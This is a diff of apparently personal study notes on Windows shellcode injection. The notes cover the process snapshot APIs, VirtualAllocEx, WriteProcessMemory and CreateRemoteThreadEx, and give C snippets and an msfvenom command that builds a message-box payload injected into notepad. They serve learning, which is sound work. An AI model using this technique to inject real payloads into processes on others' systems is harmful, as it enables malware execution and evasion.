@@ -1,10 +1,60 @@
+NECESSARY FUNCTIONS FOR PROCESS INJECTION
+-------------------------------------------
+If we are going to work with #include <tlhelp32.h>, we will use:
+
+CreateToolhelp32Snapshot — to take a snapshot of the processes.
+
+Process32First — to retrieve info about the first process.
+
+Process32Next — to iterate over remaining processes.
+
+OpenProcess — to get a handle to the target process.
+
+VirtualAllocEx — to allocate memory in the target process.
+
+WriteProcessMemory — to inject shellcode.
+
+CreateRemoteThreadEx — to execute the shellcode.
+
+SNAPSHOT CREATION & PROCESS ITERATION
+-------------------------------------
+HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+This calls a Windows API function to create a snapshot of all currently running processes in the system.
+
+- TH32CS_SNAPPROCESS: tells Windows you want to take a snapshot of the process list.
+- 0: means "give me all processes" 
+  (the second parameter can specify a specific PID if you're taking snapshots of threads or modules, but for processes, it's always 0).
+
+CreateToolhelp32Snapshot() returns a HANDLE — basically a reference to a kernel object.
+
+That handle lets you iterate through the list of processes using:
+
+    Process32First(snapshot, &pe32);
+    Process32Next(snapshot, &pe32);
+
+These functions fill in the pe32 structure with info about each process: PID, exe name, parent PID, etc.
+
+PROCESS32FIRST & PROCESS32NEXT
+-------------------------------
+Process32First() and Process32Next() are used to retrieve information about processes in the system.
+- Process32First() retrieves information about the first process in the snapshot.
+- Process32Next() retrieves information about the next process in the snapshot.
+- Both functions fill a PROCESSENTRY32 structure with details about the process, such as its ID, name, and other attributes.
+  BOOL Process32First(
+  [in]      HANDLE           hSnapshot,
+  [in, out] LPPROCESSENTRY32 lppe
+); 
+
+PROCESSENTRY32 STRUCTURE & SIZE
+-------------------------------
 pe32.dwSize = sizeof(PROCESSENTRY32);
 
-How is the sizeof calculated ?
-sizeof is a compile time operator 
-it returs the total number of bytes occupied by the type PROCESSENTRY32
+How is the sizeof calculated?
+sizeof is a compile-time operator.  
+It returns the total number of bytes occupied by the type PROCESSENTRY32.
 
-this structure is defined as:
+This structure is defined as:
 typedef struct tagPROCESSENTRY32 {
     DWORD dwSize;
     DWORD cntUsage;
@@ -18,56 +68,45 @@ typedef struct tagPROCESSENTRY32 {
     TCHAR szExeFile[MAX_PATH];
 } PROCESSENTRY32;
 
-so sizeof(PROCESSENTRY32) will compute the total size of all those fields 
+So sizeof(PROCESSENTRY32) will compute the total size of all those fields.
 
-
-HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-
-This calls a Windows API function to create a snapshot of all currently running processes in the system.
-
-TH32CS_SNAPPROCESS: tells Windows you want to take a snapshot of the process list.
-0: means "give me all processes" 
-(the second parameter can specify a specific PID if you're taking snapshots of threads or modules, but for processes, it's always 0).
-
-CreateToolhelp32Snapshot() returns a HANDLE — basically a reference to a kernel object.
-
-That handle lets you iterate through the list of processes using:
-
-Process32First(snapshot, &pe32);
-
-Process32Next(snapshot, &pe32);
-
-These functions fill in the pe32 structure with info about each process: PID, exe name, parent PID, etc.
-
+OPENING A PROCESS
+-----------------
 HANDLE OpenProcess(
   [in] DWORD dwDesiredAccess,   // Specifies the access rights requested for the process (e.g., read, write, terminate).
   [in] BOOL  bInheritHandle,    // If TRUE, the returned handle can be inherited by child processes; if FALSE, it cannot.
   [in] DWORD dwProcessId        // The unique identifier (ID) of the process to open.
 );
-If the function succeeds, the return value is an open handle to the specified process.
-If the function fails, the return value is NULL.
 
+- If the function succeeds, the return value is an open handle to the specified process.
+- If the function fails, the return value is NULL.
+
+
+MEMORY ALLOCATION IN REMOTE PROCESS
+-----------------------------------
 LPVOID VirtualAllocEx(
-  [in]           HANDLE hProcess, Expects a handle to the process where memory will be allocated.
-  [in, optional] LPVOID lpAddress, Expects a pointer to the starting address for the allocation. If NULL, the system determines the address.
-  [in]           SIZE_T dwSize, Expects the size of the memory block to be allocated, in bytes.
-  [in]           DWORD  flAllocationType, Expects the type of memory allocation (e.g., MEM_COMMIT, MEM_RESERVE).
-  [in]           DWORD  flProtect Expects the memory protection for the allocated region (e.g., PAGE_READWRITE).
+  [in]           HANDLE hProcess,         // Handle to the process where memory will be allocated.
+  [in, optional] LPVOID lpAddress,        // Starting address for the allocation. If NULL, the system picks.
+  [in]           SIZE_T dwSize,           // Size of the memory block to allocate.
+  [in]           DWORD  flAllocationType, // Type of allocation (e.g., MEM_COMMIT).
+  [in]           DWORD  flProtect         // Memory protection (e.g., PAGE_READWRITE).
 );
 
-If the function succeeds, the return value is a pointer to the allocated memory in the specified process.
-If the function fails, the return value is NULL.
+- If the function succeeds, the return value is a pointer to the allocated memory.
+- If the function fails, the return value is NULL.
 
-write process memory
+
+WRITING SHELLCODE INTO PROCESS MEMORY
+-------------------------------------
 BOOL WriteProcessMemory(
-  [in] HANDLE hProcess,         // Handle to the process whose memory is being written to.
-  [in] LPVOID lpBaseAddress,    // Pointer to the base address in the target process's memory where data will be written.
-  [in] LPCVOID lpBuffer,        // Pointer to the buffer containing the data to be written.
-  [in] SIZE_T nSize,            // Number of bytes to write.
-  [out, optional] SIZE_T *lpNumberOfBytesWritten // Optional pointer to a variable that receives the number of bytes written.
+  [in] HANDLE hProcess,
+  [in] LPVOID lpBaseAddress,
+  [in] LPCVOID lpBuffer,
+  [in] SIZE_T nSize,
+  [out, optional] SIZE_T *lpNumberOfBytesWritten
 );
 
-ex:
+Example:
 ```c
   if (WriteProcessMemory(hProcess, rAlloc_mem, ShellCode, sizeof(ShellCode), NULL)) {
       okay("Successfully wrote to process memory");
@@ -76,19 +115,19 @@ ex:
       return EXIT_FAILURE;
   }
 
-now we can create a remote thread in the target process to execute the shellcode
+CREATING A REMOTE THREAD
+-------------------------
 CreateRemoteThreadEx(
-  [in] HANDLE hProcess,         // Handle to the target process where the thread will be created.
-  [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, // Optional security attributes for the thread.
-  [in] SIZE_T dwStackSize,      // Size of the stack for the new thread. If 0, the default size is used.
-  [in] LPTHREAD_START_ROUTINE lpStartAddress, // Pointer to the function to be executed by the thread.
-  [in, optional] LPVOID lpParameter, // Optional parameter to be passed to the thread function.
-  [in] DWORD dwCreationFlags,   // Flags that control how the thread is created (e.g., CREATE_SUSPENDED).
-  [out, optional] LPDWORD lpThreadId // Optional pointer to a variable that receives the thread ID.
+[in] HANDLE hProcess,
+[in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes,
+[in] SIZE_T dwStackSize,
+[in] LPTHREAD_START_ROUTINE lpStartAddress,
+[in, optional] LPVOID lpParameter,
+[in] DWORD dwCreationFlags,
+[out, optional] LPDWORD lpThreadId
 );
 
-example:
-```c 
+Example:
   HANDLE hThread = CreateRemoteThreadEx(
       hProcess, 
       NULL, 
@@ -105,15 +144,19 @@ example:
   } else {
       okay("Successfully created remote thread");
   }
-
-in kali i used:
+GENERATING SHELLCODE (KALI)
+----------------------------
 msfvenom -p windows/x64/messagebox TEXT="I Licked Herta" TITLE="Injected" -f c --var-name=ShellCode
-to generate shellcode that displays a message box with the text "I Licked Herta!"
 
-PS C:\Eva03\GitHubRepo\Bad-Actor\Injections\output> notepad                             
-PS C:\Eva03\GitHubRepo\Bad-Actor\Injections\output> tasklist | findstr /i notepad  
-what tasklist does is it lists all the processes running on the system
-and findstr is used to filter the output to show only the lines that contain "notepad" (case-insensitive due to /i).
-This command will display the process ID (PID) and other details of the notepad process if it is running.
-If notepad is running, you will see an output like:
+FINDING PROCESS ID (PID) OF NOTEPAD
+------------------------------------
+PS> notepad
+PS> tasklist | findstr /i notepad
+
+tasklist lists all the processes.
+
+findstr /i notepad filters the list for the notepad process.
+
+If notepad is running, the output will look like:
 Notepad.exe                  22248 Console                    1   101 888 Ko
+
